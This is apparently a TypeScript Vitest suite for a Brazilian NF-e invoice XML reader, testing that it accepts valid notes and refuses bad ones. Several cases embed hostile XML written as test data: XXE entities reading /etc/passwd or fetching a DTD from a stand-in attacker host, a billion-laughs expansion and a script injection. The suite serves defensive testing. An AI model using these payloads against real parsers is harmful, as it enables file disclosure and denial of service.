import { describe, it, expect } from 'vitest';
import fs from 'fs';
import path from 'path';
import { lerNfeXml, centavosDeDecimal, MENSAGEM_XML } from '../services/gerador/nfeXml';
import { MAX_BYTES_XML } from '../services/gerador/financeiroCliente';

// O leitor do XML da NF-e (Fase 4 da Jornada): os 44 casos do protótipo, um `it` por caso. XML de exemplo FICTÍCIO. Nada de rede, disco ou IA.

const HOJE = '2026-11-05';
// No Windows o git entrega o XML com \r\n (core.autocrlf), e os replace() abaixo
// procuram \n: sem normalizar, nada é trocado e o teste lê o XML intacto.
const BASE = fs.readFileSync(path.join(__dirname, 'fixtures', 'nfe-exemplo-55.xml'), 'utf8').replace(/\r\n/g, '\n');
const CH55 = '31261011222333000181550010000012341123456788';
const dv = (c43: string): string => {
  let s = 0; let p = 2;
  for (let i = 42; i >= 0; i--) { s += Number(c43[i]) * p; p = p === 9 ? 2 : p + 1; }
  const r = s % 11;
  return c43 + String(r < 2 ? 0 : 11 - r);
};
const comChave = (xml: string, nova: string): string => xml.split(CH55).join(nova);
const ler = (s: string | Buffer) => lerNfeXml(Buffer.isBuffer(s) ? s : Buffer.from(s, 'utf8'), HOJE);
const motivo = (s: string | Buffer): string => { const r = ler(s); return r.ok ? 'OK' : r.motivo; };

describe('o leitor de XML da NF-e', () => {
  it('exemplo 55 lido inteiro', () => {
    const r = ler(BASE);
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    const x = r.nota;
    expect(x.chave).toBe(CH55);
    expect(typeof x.chave).toBe('string');
    expect(x.cnpj).toBe('11222333000181');
    expect(x.emitente).toBe('Distribuidora Solar Ficticia & Cia Ltda');
    expect(x.data).toBe('2026-10-16');
    expect(x.numero).toBe('1234');
    expect(x.modelo).toBe('55');
    expect(x.valor_total_centavos).toBe(1139600);
    expect(x.itens.map((i) => [i.descricao, i.ncm, i.quantidade, i.valor_unitario_centavos, i.valor_produto_centavos, i.valor_total_centavos])).toEqual([
      ['Modulo fotovoltaico 550 W', '85414300', 10, 65000, 650000, 660000],
      ['Inversor on-grid 5 kW', '85044090', 1, 420000, 420000, 437600],
      ['Cabo solar 6 mm preto', '85444900', 100, 435, 43500, 42000],
    ]);
    expect(x.soma_itens_centavos).toBe(x.valor_total_centavos);
    expect(x.diferenca_centavos).toBe(0);
    expect(x.itens.every((i) => Number.isInteger(i.valor_total_centavos))).toBe(true);
  });
  it('NFC-e 65 entra', () => {
    const c65 = dv(CH55.slice(0, 20) + '65' + CH55.slice(22, 43));
    const s = comChave(BASE, c65).replace('<mod>55</mod>', '<mod>65</mod>').replace('<cDV>8</cDV>', `<cDV>${c65[43]}</cDV>`);
    const r = ler(s);
    expect(r.ok).toBe(true);
    if (r.ok) expect(r.nota.modelo).toBe('65');
  });
  it('modelo 57 recusado', () => {
    const c57 = dv(CH55.slice(0, 20) + '57' + CH55.slice(22, 43));
    expect(motivo(comChave(BASE, c57).replace('<mod>55</mod>', '<mod>57</mod>'))).toBe('modelo_nao_aceito');
  });
  it('modelo 01 recusado', () => expect(motivo(BASE.replace('<mod>55</mod>', '<mod>01</mod>'))).toBe('modelo_nao_aceito'));
  it('CT-e (outro leiaute) recusado', () => expect(motivo('<?xml version="1.0"?><cteProc xmlns="http://www.portalfiscal.inf.br/cte"><CTe/></cteProc>')).toBe('proibido'));
  it('evento de cancelamento recusado', () => expect(motivo('<procEventoNFe versao="1.00" xmlns="http://www.portalfiscal.inf.br/nfe"><evento/></procEventoNFe>')).toBe('nao_e_nfe'));
  it('XXE com DOCTYPE recusado', () => {
    expect(motivo('<?xml version="1.0"?><!DOCTYPE nfeProc [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' + BASE.replace(/^<\?xml[^>]*>\s*/, '').replace('Solar Ficticia &amp;', 'Solar &xxe;'))).toBe('proibido');
  });
  it('XXE por parâmetro recusado', () => expect(motivo('<!DOCTYPE x [<!ENTITY % p SYSTEM "http://atacante.test/x.dtd"> %p;]><x/>')).toBe('proibido'));
  it('billion laughs recusado', () => expect(motivo('<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;&a;">]><l>&b;</l>')).toBe('proibido'));
  it('entidade sem DTD recusada', () => expect(motivo(BASE.replace('Solar Ficticia &amp;', 'Solar &xxe;'))).toBe('proibido'));
  it('DOCTYPE com espaço e minúscula recusado', () => expect(motivo('<! doctype x><x/>')).toBe('proibido'));
  it('instrução de processamento recusada', () => expect(motivo(BASE.replace('<nfeProc', '<?xml-stylesheet href="x.xsl"?><nfeProc'))).toBe('proibido'));
  it('namespace XHTML recusado', () => {
    expect(motivo(BASE.replace('<infAdic>', '<h:script xmlns:h="http://www.w3.org/1999/xhtml">alert(1)</h:script><infAdic>'))).toBe('proibido');
  });
  it('raiz sem o namespace da NF-e recusada', () => {
    expect(motivo(BASE.replace('<nfeProc versao="4.00" xmlns="http://www.portalfiscal.inf.br/nfe">', '<nfeProc versao="4.00">').replace('<NFe xmlns="http://www.portalfiscal.inf.br/nfe">', '<NFe>'))).toBe('nao_e_nfe');
  });
  it('malformado: tag sem fechar', () => expect(motivo(BASE.replace('</nfeProc>', ''))).toBe('malformado'));
  it('malformado: tags trocadas', () => expect(motivo(BASE.replace('</xNome>\n        <xFant>', '</xFant>\n        <xFant>'))).toBe('malformado'));
  it('malformado: cortado no meio', () => expect(motivo(BASE.slice(0, Math.floor(BASE.length / 2)))).toBe('malformado'));
  it('malformado: duas raízes', () => expect(motivo(BASE + '<outra/>')).toBe('malformado'));
  it('malformado: texto fora da raiz', () => expect(motivo(BASE + 'lixo')).toBe('malformado'));
  it('malformado: & solto', () => expect(motivo(BASE.replace('&amp; Cia', '& Cia'))).toBe('malformado'));
  it('malformado: atributo sem aspas', () => expect(motivo(BASE.replace('nItem="1"', 'nItem=1'))).toBe('malformado'));
  it('malformado: atributo repetido', () => expect(motivo(BASE.replace('nItem="1"', 'nItem="1" nItem="2"'))).toBe('malformado'));
  it('malformado: UTF-8 inválido', () => {
    const b = Buffer.from(BASE, 'utf8');
    b[b.indexOf('Modulo')] = 0xff;
    expect(motivo(b)).toBe('malformado');
  });
  it('malformado: vazio e PDF', () => {
    expect(motivo('')).toBe('malformado');
    expect(motivo('%PDF-1.4 nada')).toBe('malformado');
  });
  it('grande: acima de 1 MB', () => expect(motivo(BASE.replace('</infCpl>', 'x'.repeat(MAX_BYTES_XML) + '</infCpl>'))).toBe('grande'));
  it('grande: profundidade', () => expect(motivo('<a>'.repeat(60) + '</a>'.repeat(60))).toBe('grande'));
  it('BOM e comentário aceitos', () => expect(ler('﻿' + BASE.replace('<nfeProc', '<!-- baixado do portal --><nfeProc')).ok).toBe(true));
  it('NFe sem protocolo aceita', () => {
    const ini = BASE.indexOf('<NFe '); const fim = BASE.indexOf('</NFe>') + 6;
    expect(ler('<?xml version="1.0" encoding="UTF-8"?>' + BASE.slice(ini, fim)).ok).toBe(true);
  });
  it('homologação recusada', () => expect(motivo(BASE.replace('<tpAmb>1</tpAmb>\n        <finNFe>', '<tpAmb>2</tpAmb>\n        <finNFe>'))).toBe('homologacao'));
  it('não autorizada (cStat 302) recusada', () => expect(motivo(BASE.replace('<cStat>100</cStat>', '<cStat>302</cStat>'))).toBe('nao_autorizada'));
  it('chave com DV errado recusada', () => expect(motivo(BASE.replace(`Id="NFe${CH55}"`, `Id="NFe${CH55.slice(0, 43)}9"`))).toBe('chave_invalida'));
  it('chave que não bate com o CNPJ recusada', () => expect(motivo(BASE.replace('<CNPJ>11222333000181</CNPJ>', '<CNPJ>11444777000161</CNPJ>'))).toBe('chave_inconsistente'));
  it('chave que não bate com o nNF recusada', () => expect(motivo(BASE.replace('<nNF>1234</nNF>', '<nNF>1235</nNF>'))).toBe('chave_inconsistente'));
  it('chNFe do protocolo diferente recusado', () => {
    expect(motivo(BASE.replace(`<chNFe>${CH55}</chNFe>`, `<chNFe>${dv('3126101122233300018155001000001235112345678')}</chNFe>`))).toBe('chave_inconsistente');
  });
  it('CNPJ com DV errado recusado', () => expect(motivo(BASE.replace('<CNPJ>11222333000181</CNPJ>', '<CNPJ>11222333000182</CNPJ>'))).toBe('emitente_invalido'));
  it('data no futuro recusada', () => expect(motivo(BASE.replace('<dhEmi>2026-10-16', '<dhEmi>2026-12-16'))).toBe('data_invalida'));
  it('vNF com vírgula recusado', () => expect(motivo(BASE.replace('<vNF>11396.00</vNF>', '<vNF>11396,00</vNF>'))).toBe('valor_invalido'));
  it('vProd com 3 casas recusado', () => expect(motivo(BASE.replace('<vProd>435.00</vProd>', '<vProd>435.000</vProd>'))).toBe('valor_invalido'));
  it('sem itens recusado', () => expect(motivo(BASE.replace(/<det nItem="\d">[\s\S]*?<\/det>/g, ''))).toBe('sem_itens'));
  it('vNF maior que a soma: linha de ajuste', () => {
    const r = ler(BASE.replace('<vNF>11396.00</vNF>', '<vNF>11406.50</vNF>'));
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    const ult = r.nota.itens[r.nota.itens.length - 1];
    expect(ult.ajuste).toBe(true);
    expect(ult.valor_total_centavos).toBe(1050);
    expect(r.nota.soma_itens_centavos).toBe(1140650);
    expect(r.nota.diferenca_centavos).toBe(0);
  });
  it('vNF menor que a soma: diferença negativa, sem linha', () => {
    const r = ler(BASE.replace('<vNF>11396.00</vNF>', '<vNF>11390.00</vNF>'));
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.nota.itens.some((i) => i.ajuste)).toBe(false);
    expect(r.nota.diferenca_centavos).toBe(-600);
  });
  it('61 itens: 60 e a linha dos demais', () => {
    const det = BASE.match(/<det nItem="3">[\s\S]*?<\/det>/)![0];
    const muitos = Array.from({ length: 59 }, (_, k) => det.replace('nItem="3"', `nItem="${k + 3}"`)).join('\n');
    const r = ler(BASE.replace(det, muitos).replace('<vNF>11396.00</vNF>', `<vNF>${(6600 + 4376 + 420 * 59).toFixed(2)}</vNF>`));
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.nota.itens_na_nota).toBe(61);
    expect(r.nota.itens).toHaveLength(61);
    const ult = r.nota.itens[60];
    expect(ult.ajuste).toBe(true);
    expect(ult.descricao).toBe('Demais 1 itens e ajustes da nota');
    expect(ult.valor_total_centavos).toBe(42000);
    expect(r.nota.soma_itens_centavos).toBe(r.nota.valor_total_centavos);
  });
  it('centavos pela string', () => {
    expect(centavosDeDecimal('1.15', 2)).toBe(115);
    expect(centavosDeDecimal('4.35', 2)).toBe(435);
    expect(centavosDeDecimal('0.1', 2)).toBe(10);
    expect(centavosDeDecimal('10', 2)).toBe(1000);
    expect(centavosDeDecimal('1234567.89', 2)).toBe(123456789);
    expect(centavosDeDecimal('9999999999999.99', 2)).toBe(999999999999999);
    expect(centavosDeDecimal('2.3456789012', 10)).toBe(235);
    expect(centavosDeDecimal('1.005', 10)).toBe(101);
    expect(centavosDeDecimal('1.0049999999', 10)).toBe(100);
    for (const ruim of ['1,15', '-1.00', '1e3', ' 1.00', '', '1.', '.5', '1.234', 'NaN', '0x10']) expect(centavosDeDecimal(ruim, 2), ruim).toBeNull();
    expect(Math.round(1.005 * 100)).not.toBe(101);   // a armadilha do ponto flutuante que a string evita
  });
  it('nada de rede nem disco: o texto do leitor só importa util, jornadaObra, cnpj e financeiroCliente', () => {
    const src = fs.readFileSync(path.join(__dirname, '..', 'services', 'gerador', 'nfeXml.ts'), 'utf8');
    const imports = [...src.matchAll(/^import .* from '([^']+)';/gm)].map((m) => m[1]).sort();
    expect(imports).toEqual(['../../utils/cnpj', './financeiroCliente', './jornadaObra', 'util']);
    expect(src).not.toMatch(/require\(|from 'fs'|from 'http|from 'net'|child_process/);
  });
  it('toda mensagem de recusa existe, na lista do plano', () => {
    expect(Object.keys(MENSAGEM_XML).sort()).toEqual(['chave_inconsistente', 'chave_invalida', 'data_invalida', 'emitente_invalido', 'grande', 'homologacao', 'malformado',
      'modelo_nao_aceito', 'nao_autorizada', 'nao_e_nfe', 'proibido', 'sem_itens', 'valor_invalido']);
  });
});
